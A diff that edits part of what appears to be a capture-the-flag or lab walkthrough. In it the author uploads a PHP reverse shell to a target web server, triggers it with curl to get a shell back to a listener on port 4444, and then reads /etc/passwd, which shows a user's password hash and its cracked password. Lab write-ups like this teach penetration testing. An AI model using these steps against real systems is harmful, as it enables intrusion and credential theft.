@@ -29,7 +29,7 @@ sed -i "s/$port = 1234;/$port = 4444;/g" php-reverse-shell.php
 
 Next, we’ll click Browse, select our reverse shell file, and click upload. Once uploaded, the file appears in the web root directory listing. Let’s start a Netcat listener on port 4444 and trigger our shell by navigating to http://192.168.120.148/php-reverse-shell.php.
 
-┌──(kali㉿kali)-[~] └─$ curl http://192.168.120.148/php-reverse-shell.php
+curl http://192.168.120.148/php-reverse-shell.php
 WARNING: Failed to daemonise. This is quite common and not fatal. Successfully opened reverse shell to 192.168.118.5:4444 ...
 
 Our Netcat listener presents us with a shell as the www-data user.
@@ -40,7 +40,13 @@ Escalation User Enumeration
 
 As part of our enumeration efforts, let’s check the user accounts on the target:
 
-$ cat /etc/passwd root❌0:0:root:/root:/bin/bash ... karla❌1000:1000:karla:/home/karla:/bin/bash ... harry❌1001:1001:,,,:/home/harry:/bin/bash sally❌1002:1002:,,,:/home/sally:/bin/bash goat❌1003:1003:,,,:/home/goat:/bin/bash oracle:$1$|O@GOeN$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash lissy❌1005:1005::/home/lissy:/bin/sh
+$ cat /etc/passwd root
+0:0:root:/root:/bin/bash ... karla
+1000:1000:karla:/home/karla:/bin/bash ... harry
+1001:1001:,,,:/home/harry:/bin/bash sally
+1002:1002:,,,:/home/sally:/bin/bash goat
+1003:1003:,,,:/home/goat:/bin/bash oracle:$1$|O@GOeN$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash lissy
+1005:1005::/home/lissy:/bin/sh
 
 Although the file contains the password hash for the user oracle, cracking that password finds hiphop , but not further for privesc.
 
